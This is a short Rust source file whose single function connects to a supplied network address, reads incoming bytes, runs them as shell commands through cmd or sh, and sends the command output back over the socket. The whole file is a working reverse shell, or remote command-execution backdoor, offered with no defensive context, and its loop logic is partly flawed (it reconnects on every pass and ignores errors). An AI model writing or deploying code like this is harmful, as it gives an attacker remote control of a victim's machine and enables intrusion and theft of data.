#[allow(unused_imports)]
use std::error;
use std::io::stdin;
use std::io::{BufRead, Read, Write};
use std::net::{SocketAddr, TcpStream};
use std::process::Command;
extern crate socket2;
use self::socket2::{Domain, Socket, Type};
use http::{Request, Response};


pub fn soc(address: String) -> std::io::Result<()> {
    let mut socket = Socket::new(Domain::IPV4, Type::STREAM, None)?; // create a sockett instancce of type stream and ipv4
    loop {
        let connection: std::io::Result<()> =
            socket.connect(&address.parse::<SocketAddr>().unwrap().into());
        let mut buffer = [0u8; 512]; // initialize buffer value for the reading the stream
        let bytes_read = socket.read(&mut buffer).expect("failed to read"); // read and recieve  the stream using socket.read

        // pass the buffer into std::io::process directly, do not store buffer in another value as it will have a ownership issue
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", String::from_utf8_lossy(&buffer[..bytes_read]).trim()])
                .output()
                .expect("failed to execute process")
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(String::from_utf8_lossy(&buffer[..bytes_read]).trim())
                .output()
                .expect("failed to execute process")
        };

        let send_data = output.stdout; // sending the data over the stream .
        socket.send(&send_data);
    }

}
